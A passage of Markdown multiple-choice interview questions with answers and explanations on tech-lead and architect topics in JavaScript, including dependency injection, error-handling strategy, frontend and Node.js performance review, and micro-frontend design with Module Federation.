const service = new OrderService(mockDb, mockEmailer);
```

- A) DI makes code more complex without any benefit
- B) DI injects dependencies from outside, enabling mock/stub injection in tests and swapping implementations without changing the class
- C) DI only works with TypeScript decorators
- D) DI requires a DI container framework

**Answer: B) DI injects dependencies from outside, enabling mocking in tests and swapping implementations**

**Explanation:** Without DI, `OrderService` is tightly coupled to `PostgresDatabase` and `SendGridEmailer`. Tests would need real DB/email connections. With DI: pass mock objects in tests; swap `PostgresDatabase` for `MongoDB` without changing `OrderService`; the class depends on interfaces (duck typing), not implementations. This is the "D" in SOLID (Dependency Inversion Principle).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Tech Lead handle the "utils explosion" anti-pattern?

- A) Create a single `utils.js` file with all utility functions
- B) Organize utilities by domain/purpose (`date-utils.js`, `string-utils.js`, `array-utils.js`), ensure each utility is pure and well-tested, and deprecate/delete utilities that duplicate native browser APIs
- C) Avoid all utility functions — inline logic in each component
- D) All utilities should be moved to a separate npm package

**Answer: B) Organize by domain, ensure purity, and remove duplicates of native APIs**

**Explanation:** "Utils explosion" — a giant `utils.js` with everything — causes: circular dependencies, poor discoverability, untested code, and duplicating built-in APIs (custom `isEmpty` when `arr.length === 0` suffices). Best practice: domain-organized utils; pure functions (easy to test); named exports (tree-shakeable); regular audit to remove functions now available natively (e.g., custom `flatMap` pre-ES2019). Prefer standard library over custom utilities.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the tech lead\'s approach to managing breaking changes in an internal shared module?

- A) Immediately remove deprecated APIs and force all teams to update at once
- B) Use semantic versioning: add new API (minor bump), mark old API as `@deprecated` with migration docs, keep both for 1-2 major versions, then remove in a major version with a migration guide
- C) Never make breaking changes — design all APIs to last forever
- D) Breaking changes should be communicated only in Slack, not in code

**Answer: B) Add new API → mark old deprecated → keep both for transition period → remove in major version**

**Explanation:** Breaking change management: 1) **Add** new API, **keep** old API. 2) **`@deprecated`** JSDoc with link to replacement. 3) **Minor version** bump. 4) **Communication**: changelog, team announcement, migration guide. 5) After transition period (1-2 major versions), **remove** in major bump. This approach allows teams to migrate at their own pace and avoids "big bang" coordinations. Use `eslint-plugin-deprecation` to surface deprecated usages in CI.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 31. Error Handling Strategy

<br>

## Q. A Tech Lead designs a centralized error handling strategy for a Node.js Express API. Which approach is the most robust for production?

```javascript
// Option A — inline try/catch in every route
app.get("/users/:id", async (req, res) => {
  try {
    const user = await UserService.getById(req.params.id);
    res.json(user);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Option B — centralized error middleware + async wrapper
const asyncHandler = fn => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);

app.get("/users/:id", asyncHandler(async (req, res) => {
  const user = await UserService.getById(req.params.id);
  res.json(user);
}));

app.use((err, req, res, next) => {
  logger.error(err);
  res.status(err.statusCode || 500).json({ error: err.message });
});
```

- A) Option A — inline try/catch is more explicit and easier for junior developers to understand
- B) Option B — centralized error middleware ensures consistent error responses, logging, and status codes across all routes without duplicating error-handling logic
- C) Both are equivalent; the choice is purely stylistic
- D) Option B is dangerous because unhandled errors in `asyncHandler` will crash the server

**Answer: B) Option B — centralized error middleware ensures consistent error responses, logging, and status codes across all routes without duplicating error-handling logic**

**Explanation:** Option A scatters error handling across every route, leading to inconsistent formats, missing logging, and high maintenance overhead. A Tech Lead should implement a central error middleware that all routes funnel into via `next(err)`, combined with a typed error hierarchy (`AppError`, `ValidationError`, etc.) to produce structured, consistent API error responses with proper HTTP status codes.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the right strategy for structuring a typed error hierarchy?

```javascript
class AppError extends Error {
  constructor(message, statusCode, code) {
    super(message);
    this.name = this.constructor.name;
    this.statusCode = statusCode;
    this.code = code;
    this.isOperational = true; // vs programming errors
  }
}

class ValidationError extends AppError {
  constructor(message, fields) {
    super(message, 400, 'VALIDATION_ERROR');
    this.fields = fields;
  }
}
class NotFoundError extends AppError {
  constructor(resource) {
    super(`${resource} not found`, 404, 'NOT_FOUND');
  }
}
```

- A) All errors should extend `Error` directly for simplicity
- B) A typed error hierarchy enables structured error handling: catch by type, map to HTTP status codes automatically, distinguish operational from programming errors, and generate consistent API error responses
- C) Typed errors require TypeScript — not possible in vanilla JavaScript
- D) The `isOperational` flag serves no purpose

**Answer: B) A typed hierarchy enables structured handling: catch by type, map to status codes, distinguish operational errors**

**Explanation:** `isOperational: true` marks expected errors (validation, not found) that should be reported gracefully vs programming bugs (`TypeError`, `ReferenceError`) that should crash the process (or at least alert). The hierarchy enables: `if (error instanceof ValidationError) return res.status(400)`; central error handler that maps error types to responses; consistent error codes for frontend handling; and filtering operational errors from monitoring alerts.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Tech Lead implement distributed tracing for errors across microservices?

- A) Log all errors to `console.error` in each service
- B) Attach a correlation ID to each request that propagates through all services; include it in all error logs and responses so errors can be traced across the entire request chain
- C) Use synchronous error propagation across service boundaries
- D) Each microservice should have a completely independent error handling strategy

**Answer: B) Correlation IDs that propagate through all services, included in all logs and error responses**

**Explanation:** Distributed request tracing: 1) Generate a unique `correlationId` (UUID) at the API gateway on each request. 2) Pass it via HTTP header (`X-Correlation-ID`) to all downstream services. 3) Include it in every log entry. 4) Include it in error responses for user support tickets. 5) Use tools like OpenTelemetry + Jaeger/Zipkin for visual traces. When a user reports "error ID: abc123", you can find every log entry across all services in milliseconds.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between a global error boundary and per-component error handling in React?

```javascript
// Global Error Boundary
class AppErrorBoundary extends React.Component {
  state = { hasError: false };
  static getDerivedStateFromError(error) { return { hasError: true }; }
  componentDidCatch(error, info) { logErrorToService(error, info); }
  render() { return this.state.hasError ? <ErrorPage /> : this.props.children; }
}

// Granular Error Boundary
<AppErrorBoundary>
  <Header />
  <ErrorBoundary fallback={<WidgetError />}><UserWidget /></ErrorBoundary>
  <ErrorBoundary fallback={<FeedError />}><NewsFeed /></ErrorBoundary>
</AppErrorBoundary>
```

- A) Error boundaries should always be global — granular boundaries add complexity
- B) Granular error boundaries isolate failures — a crashed widget doesn\'t take down the whole app; users see partial functionality instead of a blank error page
- C) React handles all component errors automatically without error boundaries
- D) `componentDidCatch` only works with async errors

**Answer: B) Granular error boundaries isolate failures — crashed widgets don\'t take down the whole app**

**Explanation:** A single global boundary means any component crash shows the same full-page error. Granular boundaries at the dashboard widget or section level enable graceful degradation: the news feed crashes → shows a "Feed unavailable" message; header and sidebar still work. Tech Leads should define a standard error boundary component and establish guidelines for where to place boundaries (route level, widget level, critical sections).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the Tech Lead\'s approach to unhandled promise rejections in a Node.js application?

```javascript
process.on('unhandledRejection', (reason, promise) => {
  logger.error({ reason, promise }, 'Unhandled Rejection');
  // In production: should we crash or continue?
});
```

- A) Always ignore unhandled rejections — they don\'t affect stability
- B) Log all unhandled rejections; crash the process for programming errors (unknown error types); gracefully handle operational errors. In Node 15+, unhandled rejections crash the process by default
- C) Always crash the process on any unhandled rejection
- D) Unhandled rejections are automatically handled by Node.js — no intervention needed

**Answer: B) Log always; crash for programming errors; Node 15+ crashes by default**

**Explanation:** Node.js 15+ changed the default: unhandled rejections crash the process. Best practice: 1) Catch all rejections at the call site. 2) `unhandledRejection` handler as a last resort: log the error with full context. 3) If `error.isOperational` (expected error somehow missed) → log and continue. 4) If unknown error type → it\'s a bug, crash the process, let the process manager (PM2, systemd, Kubernetes) restart it cleanly.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Tech Lead integrate error monitoring (Sentry/Datadog) into the error strategy?

- A) Just add Sentry at the top level — no additional configuration needed
- B) Configure enriched error context (user, release version, request data), set up alert rules for error rate spikes, group similar errors, and integrate with the deployment pipeline for release tracking
- C) Error monitoring is only necessary for production, not staging
- D) Only network errors should be sent to monitoring tools

**Answer: B) Enriched context, alert rules, error grouping, and deployment integration**

**Explanation:** Effective error monitoring: 1) **Enrich errors** — attach `user.id`, `session.id`, `release` version (commit SHA), URL, browser/OS. 2) **Alert rules** — alert on error rate > 5%, new errors, regression in known errors. 3) **Release tracking** — correlate error spikes with deployments. 4) **Before/after release** — compare error rates. 5) **Ignore expected errors** — filter out noise (network errors from user\'s ISP, bot traffic). This enables rapid identification of regressions.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the right error handling pattern for form validation in a UI?

```javascript
function validateForm(data) {
  const errors = {};
  if (!data.email?.includes('@')) errors.email = 'Invalid email address';
  if ((data.password?.length ?? 0) < 8) errors.password = 'Password must be 8+ characters';
  if (!data.name?.trim()) errors.name = 'Name is required';
  return errors;
}
const errors = validateForm(formData);
const isValid = Object.keys(errors).length === 0;
```

- A) Form validation errors should throw exceptions
- B) Form validation returns an error map (field → message) instead of throwing — enabling inline field-level error display, partial validation, and progressive enhancement
- C) Form validation should only happen server-side
- D) Using `Object.keys(errors).length === 0` to check validity is unreliable

**Answer: B) Return an error map instead of throwing — enables field-level error display and partial validation**

**Explanation:** Form validation is not "exceptional" — invalid user input is an expected case, not an error. Throwing exceptions for validation creates awkward try/catch in form handlers. Returning an error map: enables per-field inline errors (red border + message under each field); supports submit-button enable/disable based on `isValid`; allows progressive validation on blur. Libraries like Yup, Zod, and `react-hook-form` use this pattern.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct approach to error handling in a Redux/state management context?

```javascript
// Redux Toolkit slice
const userSlice = createSlice({
  name: 'user',
  initialState: { data: null, loading: false, error: null },
  reducers: {},
  extraReducers: (builder) => {
    builder
      .addCase(fetchUser.pending, (state) => { state.loading = true; state.error = null; })
      .addCase(fetchUser.fulfilled, (state, action) => { state.loading = false; state.data = action.payload; })
      .addCase(fetchUser.rejected, (state, action) => { state.loading = false; state.error = action.error.message; });
  }
});
```

- A) Errors should be thrown from reducers to propagate to the UI
- B) Store errors in state alongside the data — track `loading`, `data`, and `error` as separate state slices; UI derives display from state
- C) Errors should be handled in the component and never reach the store
- D) All three state properties should be stored in a single string

**Answer: B) Store errors in state — track loading/data/error as separate slices; UI derives display from state**

**Explanation:** State machine approach: `{ loading: true, data: null, error: null }` → `{ loading: false, data: {...}, error: null }` → `{ loading: false, data: null, error: "Network error" }`. These states are mutually exclusive. Components derive behavior from state: show spinner while loading, show error message on error, show data on success. This is the standard Redux Toolkit pattern and scales to any async state management.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the right pattern for the Result type in JavaScript error handling?

```javascript
// Result pattern — avoids throwing
function divide(a, b) {
  if (b === 0) return { ok: false, error: 'Division by zero' };
  return { ok: true, value: a / b };
}

const result = divide(10, 0);
if (result.ok) {
  console.log('Result:', result.value);
} else {
  console.log('Error:', result.error);
}
```

- A) This pattern is inferior to throwing exceptions in all cases
- B) The Result type makes errors explicit in the function signature — callers must handle the error case, preventing forgotten error handling
- C) This pattern prevents TypeScript from working correctly
- D) The `ok` flag should be removed for simplicity

**Answer: B) Result type makes errors explicit — callers must handle both success and failure**

**Explanation:** With exceptions, callers can forget to `try/catch`. The Result type forces callers to check `result.ok` before using `result.value`. This pattern (from Rust\'s `Result<T, E>`, Haskell\'s `Either`) makes the error possibility part of the API contract. TypeScript can type this as `{ ok: true; value: T } | { ok: false; error: string }` with full type narrowing. Useful for predictable failure cases (validation, parsing, business rules).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 32. Performance Review

<br>

## Q. A Tech Lead reviews a React component and identifies a performance problem. What is wrong?

```javascript
function UserList({ users }) {
  const sortedUsers = users.sort((a, b) => a.name.localeCompare(b.name));
  return (
    <ul>
      {sortedUsers.map(user => (
        <li key={user.id}>{user.name}</li>
      ))}
    </ul>
  );
}
```

- A) `.sort()` is the wrong method — use `.map()` with a comparator
- B) `.sort()` mutates the original `users` prop array and the sort runs on every render — use `useMemo` and `.slice().sort()`
- C) The component is missing a `useCallback` on the comparator function
- D) `key={user.id}` should be `key={user.name}` for stable rendering

**Answer: B) `.sort()` mutates the original `users` prop array and the sort runs on every render — use `useMemo` and `.slice().sort()`**

**Explanation:** `Array.prototype.sort` mutates in place, which violates React\'s immutability principle and can cause subtle bugs upstream. Additionally, the sort re-runs on every render regardless of whether `users` changed. The fix: `const sortedUsers = useMemo(() => [...users].sort((a, b) => a.name.localeCompare(b.name)), [users])`. A Tech Lead should add this as a lint rule or code review checklist item.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Tech Lead is reviewing a data-processing script that runs in Node.js and blocks the event loop. Which refactoring is most appropriate?

```javascript
// Current — synchronous, blocks the event loop for large datasets
app.get("/report", (req, res) => {
  const data = fs.readFileSync("large-dataset.json");
  const result = heavyComputation(JSON.parse(data));
  res.json(result);
});
```

- A) Replace `JSON.parse` with `JSON.stringify` to reduce processing time
- B) Move the blocking I/O and CPU computation to a Worker Thread to keep the event loop free
- C) Wrap the whole handler in `setTimeout(fn, 0)` to defer execution
- D) Use `process.nextTick` to defer `heavyComputation` until after the response is sent

**Answer: B) Move the blocking I/O and CPU computation to a Worker Thread to keep the event loop free**

**Explanation:** `fs.readFileSync` and a heavy synchronous computation both block Node.js\'s single-threaded event loop, freezing all other requests during execution. The correct fix is: (1) replace `readFileSync` with `fs.promises.readFile` and (2) offload `heavyComputation` to a `Worker` from the `worker_threads` module. This keeps the event loop responsive while heavy work runs in a separate thread.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does Core Web Vitals measure and how should a Tech Lead act on them?

- A) Core Web Vitals measure JavaScript bundle size — reduce below 200KB
- B) Core Web Vitals measure real-user experience: LCP (load), INP (interactivity), and CLS (visual stability) — directly affecting SEO and user retention
- C) Core Web Vitals only affect mobile devices
- D) Core Web Vitals are replaced by Lighthouse scores

**Answer: B) Core Web Vitals measure LCP (load), INP (interactivity), and CLS (visual stability)**

**Explanation:** Google\'s Core Web Vitals: **LCP** (Largest Contentful Paint, should be < 2.5s) — how fast the main content loads. **INP** (Interaction to Next Paint, < 200ms) — how responsive the page is to interactions. **CLS** (Cumulative Layout Shift, < 0.1) — how much content unexpectedly jumps. Failing these affects SEO rankings. A Tech Lead should monitor CWV in production with Real User Monitoring (RUM) and create tickets for regressions.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the impact of third-party scripts on performance?

- A) Third-party scripts are hosted on CDNs, so they always load faster than first-party scripts
- B) Third-party scripts (analytics, ads, chat widgets) can block rendering, parse slowly, and consume main thread time — each should be audited for performance impact and loaded asynchronously or deferred
- C) Third-party scripts don\'t affect Lighthouse scores
- D) Blocking third-party scripts have no impact if your first-party code is fast

**Answer: B) Third-party scripts can block rendering and consume main thread time — load async or defer**

**Explanation:** Third-party scripts often represent the majority of a page\'s JS execution time. Each should be evaluated: is it critical (chat support) or nice-to-have (heat mapping)? Load critical ones with `async`/`defer`; defer nice-to-have ones until after the page loads (`setTimeout(() => loadScript(), 3000)` or `requestIdleCallback`). Use `resource-timing` API to measure their load times. Remove scripts that provide < ROI relative to their performance cost.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What should a performance review checklist include for a large React application?

- A) Only check bundle size — other metrics are secondary
- B) Bundle size (vendor/app split), render performance (React DevTools Profiler), unnecessary re-renders (memo/useCallback), lazy loading, image optimization, and Core Web Vitals in production
- C) Performance review should only happen after user complaints
- D) Component count is the primary metric

**Answer: B) Bundle size, render performance, unnecessary re-renders, lazy loading, images, and CWV in production**

**Explanation:** Comprehensive performance review: 1) **Bundle analysis** (webpack-bundle-analyzer) — identify large dependencies. 2) **React Profiler** — find slow renders, flamegraphs. 3) **Re-render audit** — use `why-did-you-render` to find unnecessary renders. 4) **Code splitting** — are routes lazily loaded? 5) **Images** — WebP format, `loading="lazy"`, correct dimensions. 6) **CWV in production** — RUM data from real users is more valuable than Lighthouse scores.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the tech lead\'s approach to database query performance in a Node.js API?

- A) Add indexes to every column for maximum speed
- B) Analyze slow queries with EXPLAIN, add targeted indexes on queried/sorted columns, implement query result caching (Redis), use pagination, and avoid N+1 queries by using joins or DataLoader
- C) Database performance is the DBA\'s responsibility — frontend teams shouldn\'t worry about it
- D) Fetch all data in the application and filter in JavaScript for simplicity

**Answer: B) EXPLAIN, targeted indexes, Redis caching, pagination, and avoiding N+1 queries**

**Explanation:** N+1 problem: fetching 100 users then making 100 individual "fetch user\'s orders" queries = 101 DB calls. Fix: JOIN at DB level or DataLoader batching. Performance tools: `EXPLAIN ANALYZE` shows query execution plan; indexes on `WHERE`, `ORDER BY`, `JOIN` columns; Redis cache for frequently read, rarely changed data; pagination prevents unbounded result sets. A Tech Lead should set up slow query logging (> 100ms threshold) in production.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a bundle size audit typically reveal and how should a Tech Lead act on findings?

```
Bundle Analysis:
  vendor.js: 1.2MB (react, react-dom, lodash, moment, axios...)
  app.js: 450KB
  
  Largest dependencies:
  moment: 232KB → replace with date-fns (tree-shakeable, 30KB)
  lodash: 70KB → use lodash-es or individual imports
  chart.js: 200KB → lazy load only on chart pages
```

- A) Bundle size is irrelevant — fast internet makes size unimportant
- B) Replace moment with date-fns/dayjs, use tree-shakeable lodash, lazy load chart.js on demand, and set bundle size budgets in CI to prevent regressions
- C) Only reduce app.js, never vendor.js
- D) Minification alone is sufficient — no library replacements needed

**Answer: B) Replace heavy libraries with lightweight alternatives, lazy load, and set CI bundle size budgets**

**Explanation:** Systematic approach: 1) **moment → date-fns/dayjs** (2-9KB vs 232KB). 2) **lodash → lodash-es** with tree shaking. 3) **Chart.js** — dynamic `import('./chart.js')` only on chart pages. 4) Set `performance.maxAssetSize` in webpack config — fail CI if bundle exceeds budget. 5) Track bundle size in PRs (`bundlesize` CLI or size-limit). Preventing regression is more important than one-time optimization.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What performance problem does excessive React context cause?

```javascript
// Problematic: one large context
const AppContext = createContext();
// Value includes: user, theme, cart, notifications, features...
// Any change to any property re-renders ALL consumers

// Better: split contexts by update frequency
const UserContext = createContext();    // changes rarely
const ThemeContext = createContext();   // user preference
const CartContext = createContext();    // changes frequently
```

- A) Context always causes better performance than prop drilling
- B) A single large context causes all consumers to re-render whenever any part of the value changes — even if the consumer only uses a small slice of the context
- C) Splitting contexts breaks React\'s data flow model
- D) `React.memo` on the context provider prevents all re-renders

**Answer: B) A large context causes all consumers to re-render when any part of the value changes**

**Explanation:** When `AppContext.value` changes (e.g., cart updates), every component consuming `AppContext` re-renders, even if it only reads `theme`. Solution: split context by **update frequency** (user context changes rarely; cart changes on every add/remove). Also consider `useMemo` for context values to stabilize object references. For complex state, Zustand or Redux Toolkit avoid context re-render issues entirely.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the right approach to measuring and improving Time to First Byte (TTFB)?

- A) TTFB is entirely a network issue — frontend developers cannot improve it
- B) TTFB includes server processing time — improve it via CDN edge caching, SSR caching, database query optimization, and reducing backend response generation time
- C) TTFB only matters for API requests, not page navigation
- D) Adding a Service Worker automatically improves TTFB

**Answer: B) TTFB includes server processing time — improve via CDN, SSR caching, and database optimization**

**Explanation:** TTFB measures time from request to first byte received. Components: DNS lookup + TCP connection + TLS handshake + server processing time. Improvements: 1) **CDN** for static assets and edge-cached responses. 2) **SSR caching** — cache rendered HTML at CDN edge (Next.js ISR). 3) **Database optimization** — slow queries inflate TTFB. 4) **Connection pooling** — reuse DB connections. 5) **HTTP/2** or **HTTP/3** for multiplexing. Target TTFB < 600ms for a "Good" rating.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the performance impact of synchronous `localStorage` calls in a hot path?

```javascript
// Called on every scroll event (60fps)
document.addEventListener('scroll', () => {
  localStorage.setItem('scrollPos', window.scrollY); // synchronous I/O!
});
```

- A) No impact — `localStorage` operations are asynchronous
- B) `localStorage.setItem` is a synchronous, blocking operation — calling it 60 times/second in a scroll handler blocks the main thread and causes scroll jank
- C) `localStorage` is a Web Worker API — it doesn\'t block the main thread
- D) Modern browsers batch `localStorage` writes automatically

**Answer: B) `localStorage.setItem` is synchronous and blocking — 60fps calls cause scroll jank**

**Explanation:** `localStorage` operations are **synchronous** — they block the main thread while reading/writing from disk. Calling them in high-frequency events (scroll, mousemove, input) causes jank. Fix: debounce writes (`debounce(fn, 500)` in scroll handler); use `sessionStorage` with `requestIdleCallback` for persistence; or use an in-memory variable that syncs to storage at lower frequency. For high-frequency state, keep data in memory and persist periodically.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `scheduler.yield()` (or the `MessageChannel` technique) solve in long tasks?

```javascript
async function processLargeArray(items) {
  for (let i = 0; i < items.length; i++) {
    processItem(items[i]);
    
    // Yield to the browser every 50 items
    if (i % 50 === 0) {
      await new Promise(resolve => setTimeout(resolve, 0));
      // or: await scheduler.yield(); (Chrome 115+)
    }
  }
}
```

- A) Yielding makes the loop slower — tasks should always run to completion
- B) Yielding periodically allows the browser to handle pending user interactions and renders between iterations, preventing "Long Tasks" (>50ms) that cause UI jank
- C) `scheduler.yield()` is equivalent to `Promise.resolve()` with no timing difference
- D) Yielding only helps with animation — not general-purpose long tasks

**Answer: B) Yielding allows the browser to handle interactions between iterations — preventing jank from Long Tasks**

**Explanation:** A "Long Task" (> 50ms) blocks the main thread from handling clicks, renders, and other events. For loops processing 1000+ items, yield every N items to give the browser "air" to process the interaction queue. `setTimeout(resolve, 0)` schedules in the macrotask queue after pending microtasks and a render frame. `scheduler.yield()` (Chrome 115+) is a higher-priority yield for user inputs. This makes UIs responsive even during heavy computation.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## L6: Technical Architect

<br>

## # 33. Micro-Frontend Architecture

<br>

## Q. A Technical Architect is designing a micro-frontend system where five teams independently deploy their applications. Which approach best achieves runtime integration with independent deployments and shared dependencies?

- A) Build-time integration via an npm monorepo — all apps are compiled together into one bundle
- B) Module Federation (Webpack 5) — each micro-frontend exposes and consumes modules at runtime without sharing build artifacts
- C) iFrame isolation — each app runs in a separate iframe with `postMessage` for communication
- D) Web Components with Shadow DOM — each team builds custom elements and registers them in the main shell

**Answer: B) Module Federation (Webpack 5) — each micro-frontend exposes and consumes modules at runtime without sharing build artifacts**

**Explanation:** Module Federation allows independently deployed applications to share code (e.g., React, shared utilities) at runtime via a host/remote contract, with version negotiation. Build-time npm integration breaks independent deployability. iFrames provide strong isolation but poor UX integration. Web Components are useful for shared UI primitives but don\'t solve runtime code sharing. Module Federation is the industry standard for enterprise micro-frontends requiring true independent deployment.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A Technical Architect reviews a micro-frontend shell that uses Module Federation. A shared `React` dependency is configured as follows. What is the architectural risk?

```javascript
// webpack.config.js (host shell)
new ModuleFederationPlugin({
  shared: {
    react: { singleton: true, requiredVersion: "^18.0.0" },
    "react-dom": { singleton: true, requiredVersion: "^18.0.0" }
  }
})
```

- A) `singleton: true` causes React to be loaded twice — one instance per remote
- B) If a remote specifies `react: "17.0.0"`, the version negotiation may fail at runtime, breaking that remote\'s rendering
- C) `requiredVersion` is not a valid Module Federation option and will be silently ignored
- D) Shared React without `eager: true` on the host causes a waterfall loading issue in all remotes

**Answer: B) If a remote specifies `react: "17.0.0"`, the version negotiation may fail at runtime, breaking that remote\'s rendering**

**Explanation:** `singleton: true` ensures only one React instance is used globally (preventing "multiple React" errors). However, if a remote requires `react@17` and the host singleton is `react@18`, Module Federation\'s version negotiation may fall back or throw a warning/error. The architect should define a shared dependency upgrade policy, establish minimum version requirements for all teams, and monitor for version mismatch errors during deployments.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect handle cross-MFE routing in a micro-frontend system?

- A) Each micro-frontend should own and manage the entire URL path independently
- B) The shell application owns the top-level routing; micro-frontends register their routes with the shell and own sub-routes within their allocated path prefix (e.g., `/products/*`)
- C) Use `window.location.href` assignment for cross-MFE navigation
- D) All routing must go through a shared Redux action — no direct URL manipulation

**Answer: B) Shell owns top-level routing; MFEs register routes and own sub-routes within their allocated path prefix**

**Explanation:** Architecture: Shell application owns `/products → ProductsMFE`, `/checkout → CheckoutMFE`. Each MFE registers its routes at mount time and handles its own sub-routing (`/products/list`, `/products/:id`). Cross-MFE navigation uses the shell\'s router (emit a navigation event → shell handles the route change). This prevents URL ownership conflicts, allows deep linking, and supports independent deployment. Tools: single-spa `registerApplication`, qiankun `registerMicroApps`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the architectural solution for CSS isolation in a micro-frontend system?

- A) All micro-frontends share a global CSS file to maintain consistency
- B) CSS Modules, Shadow DOM (web components), or auto-prefixing with BEM namespace (`[mfe-name]__component`) — preventing style bleeding between micro-frontends while allowing design system token sharing
- C) Inline styles on every element — the only guarantee of isolation
- D) CSS isolation is not necessary as long as each MFE has a unique class prefix

**Answer: B) CSS Modules, Shadow DOM, or BEM namespace prefixing — preventing style bleeding while allowing design token sharing**

**Explanation:** Style bleeding is a major source of MFE bugs. Solutions by isolation strength: 1) **BEM namespacing** — `products__button` vs `checkout__button` (simple but relies on convention). 2) **CSS Modules** — compile-time unique class names (strong, requires build tooling). 3) **Shadow DOM** — full encapsulation, but breaks global design system inheritance. 4) **CSS-in-JS** (styled-components) — scoped by default. Design tokens (CSS custom properties) can be shared via the `:root` scope without conflicts.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What strategy should a Technical Architect use for a micro-frontend design system?

- A) Each MFE builds its own components from scratch — shared components create coupling
- B) Publish a shared design system as a versioned npm package; MFEs declare it as a peer dependency; Module Federation shares it as a singleton at runtime
- C) Embed design system code directly in each MFE at build time, accepting duplication
- D) Design system components should be loaded via `<script>` tag from a CDN

**Answer: B) Versioned npm package as peer dependency; Module Federation shares it as singleton at runtime**

**Explanation:** Two concerns: 1) **Development contract** — publish to a private npm registry (or monorepo package) with semantic versioning; MFEs use it as a peer dependency and run it locally. 2) **Runtime deduplication** — Module Federation `shared: { 'design-system': { singleton: true } }` ensures only one instance loads. Breaking changes require a major version bump with a migration guide. This balances consistency (same visual components everywhere) with team autonomy (opt-in upgrade timing).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect handle authentication and authorization across micro-frontends?

- A) Each micro-frontend manages its own login flow and session
- B) The shell handles authentication; auth tokens are stored centrally and distributed to MFEs via a shared auth service; MFEs check authorization before mounting
- C) Each MFE duplicates authentication code for maximum independence
- D) Authentication should happen at the CDN level only

**Answer: B) Shell handles auth; tokens distributed via shared auth service; MFEs check authorization before mounting**

**Explanation:** Single sign-on architecture: 1) Shell authenticates the user (OIDC/OAuth2 flow). 2) Token stored in memory (not localStorage — XSS risk); accessible via a shared auth service (not global variable). 3) MFEs receive an auth token from the shell at mount time. 4) Each MFE validates the user\'s roles/permissions before rendering sensitive routes. 5) Token refresh is handled centrally by the shell. This prevents each team from re-implementing auth logic and ensures consistent token management.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the correct performance strategy for loading multiple micro-frontends?

- A) Load all MFEs eagerly on page load to minimize latency during navigation
- B) Use lazy loading — load each MFE\'s JavaScript bundle only when the user navigates to that MFE\'s route; preload likely-next MFEs using `<link rel="prefetch">`
- C) Bundle all MFEs into a single JavaScript file for HTTP/2 multiplexing benefits
- D) MFE loading performance cannot be optimized — it\'s an inherent cost

**Answer: B) Lazy load per-route; prefetch likely-next MFEs with `<link rel="prefetch">`**

**Explanation:** Eager loading all MFEs negates the size benefits of splitting. Lazy loading: the shell loads an MFE\'s remote entry JS only when navigating to that MFE\'s route. Prefetching: after the current MFE loads, the shell `<link rel="prefetch">` the next likely MFE (e.g., after loading the product list page, prefetch the product detail MFE). Module Federation\'s `import()` is lazy by default. Combine with HTTP/2 push for critical MFEs.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How should a Technical Architect handle error isolation in a micro-frontend system?

- A) If one MFE crashes, the shell should crash with it — this is unavoidable
- B) Wrap each MFE mount point in an error boundary; if an MFE fails to load (network error) or throws during runtime, display a fallback UI without affecting other MFEs
- C) Remove any MFE that has crashed entirely until it\'s redeployed
- D) Error handling is the responsibility of individual MFE teams, not the architect

**Answer: B) Error boundaries per MFE mount point — crashed MFEs show fallback UI without affecting others**

**Explanation:** Resilience pattern: the shell wraps each MFE in a React Error Boundary (or equivalent). If `CheckoutMFE` crashes (runtime error) or fails to load (network failure to fetch remote entry), the error boundary catches it and renders a degraded experience ("Checkout temporarily unavailable. Try again."). Header, navigation, and ProductsMFE remain fully functional. Additionally: health check endpoints per MFE, circuit breaker for remote entry fetching, and automated alerting for MFE load failures.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the testing strategy for a micro-frontend architecture?

- A) Each MFE team writes only unit tests — integration testing is too complex in MFE systems
- B) Three levels: unit tests per MFE (isolated), contract tests for MFE interfaces (Pact), and end-to-end integration tests in the shell testing the full user journey across MFEs
- C) Only end-to-end tests are needed — unit tests provide false confidence
